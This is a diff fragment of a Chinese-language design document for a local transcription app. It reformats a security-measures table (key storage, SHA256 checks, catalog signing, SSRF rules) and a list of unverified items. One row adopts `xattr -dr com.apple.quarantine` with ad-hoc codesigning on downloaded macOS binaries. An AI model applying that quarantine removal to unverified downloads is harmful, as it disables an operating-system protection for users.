-| **依赖供应链** | lockfile 必须提交；CI 跑 `npm audit` + license 报告（报告模式，ADR-002）|
-| **零遥测** | 无任何自动上报；诊断包只在用户点击时本地生成 |
-| **SSRF** | §8.4 第三层的私网拒绝规则同样适用于 `DirectHttpSource`、`RssSource`、以及用户自填的 LLM `baseUrl`（**但 `baseUrl` 需允许 localhost**——Ollama 就在本机 → 该规则对 `baseUrl` 走单独的、更宽松的白名单，且需用户显式确认）|
+| 项               | 措施                                                                                                                                                                                                                    |
+| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **API Key 存储** | **待 Manager 决策**（§9 决策项 1）。默认方案：存 SQLite 的 `secrets` 表，文件 0600 / 目录 0700，UI **明确告知"未加密存储"**；不写日志、不进诊断包、不出现在 API 响应（只返回 `sk-…abcd` 掩码）                          |
+| **下载物完整性** | 一律 SHA256 校验后才算安装 `[已定，ADR-004 决策 5，GPT4All 范式]`；**判重按 SHA256 不按体积** `[已定，ADR-004 决策 4]`                                                                                                  |
+| **目录签名**     | 远程模型目录 JSON 用 Ed25519 签名，公钥硬编码 `[R-04 §10.3 已提出]`                                                                                                                                                     |
+| **ad-hoc 签名**  | macOS 下载的二进制 `codesign -s -` + `xattr -dr com.apple.quarantine` `[已定，ADR-003 决策 4]`。**注意**：这条命令的参数里有路径，同样走 `SubprocessRunner` 的路径校验                                                  |
+| **依赖供应链**   | lockfile 必须提交；CI 跑 `npm audit` + license 报告（报告模式，ADR-002）                                                                                                                                                |
+| **零遥测**       | 无任何自动上报；诊断包只在用户点击时本地生成                                                                                                                                                                            |
+| **SSRF**         | §8.4 第三层的私网拒绝规则同样适用于 `DirectHttpSource`、`RssSource`、以及用户自填的 LLM `baseUrl`（**但 `baseUrl` 需允许 localhost**——Ollama 就在本机 → 该规则对 `baseUrl` 走单独的、更宽松的白名单，且需用户显式确认） |
 
 ---
 
@@ -1233,14 +1287,14 @@ uid/gid:  保持当前用户（不提权）；未来可考虑 Linux 上加 secco
 
 ## §10 待验证清单（诚实）
 
-| # | 事项 | 状态 |
-|---|---|---|
-| V-1 | 端口 17650 的实际占用情况 | 未调研 |
-| V-2 | yt-dlp 是否支持 `--` 选项终止符 | ✅ **已核实**（README usage: `yt-dlp [OPTIONS] [--] URL [URL...]`）。但官方无专门安全说明段落 = UNKNOWN |
-| V-3 | llama-server / Ollama 的 OpenAI 兼容端点 | 文档级，未实测 |
-| V-4 | transformers.js WebGPU whisper 的实际可用性与速度 | **未验证**，Wave 3 需 spike |
-| V-5 | Windows 优雅退出的 5 秒窗口与 `taskkill /T` 行为 | 未验证（无 Windows 机器） |
-| V-6 | 流式录音的 PCM 与 MediaRecorder 双写时钟漂移量 | 未验证 |
-| V-7 | LLM 回填 `startMs/endMs` 的准确率与文本回溯匹配的效果 | 未验证 |
-| V-8 | `nice()` / `BELOW_NORMAL_PRIORITY_CLASS` 对 whisper.cpp 吞吐的影响 | 未验证 |
-| V-9 | 本文所有时序图 | **设计意图，零代码跑通** |
+| #   | 事项                                                               | 状态                                                                                                    |
+| --- | ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
+| V-1 | 端口 17650 的实际占用情况                                          | 未调研                                                                                                  |
+| V-2 | yt-dlp 是否支持 `--` 选项终止符                                    | ✅ **已核实**（README usage: `yt-dlp [OPTIONS] [--] URL [URL...]`）。但官方无专门安全说明段落 = UNKNOWN |
+| V-3 | llama-server / Ollama 的 OpenAI 兼容端点                           | 文档级，未实测                                                                                          |
+| V-4 | transformers.js WebGPU whisper 的实际可用性与速度                  | **未验证**，Wave 3 需 spike                                                                             |
+| V-5 | Windows 优雅退出的 5 秒窗口与 `taskkill /T` 行为                   | 未验证（无 Windows 机器）                                                                               |
+| V-6 | 流式录音的 PCM 与 MediaRecorder 双写时钟漂移量                     | 未验证                                                                                                  |
+| V-7 | LLM 回填 `startMs/endMs` 的准确率与文本回溯匹配的效果              | 未验证                                                                                                  |
+| V-8 | `nice()` / `BELOW_NORMAL_PRIORITY_CLASS` 对 whisper.cpp 吞吐的影响 | 未验证                                                                                                  |
+| V-9 | 本文所有时序图                                                     | **设计意图，零代码跑通**                                                                                |
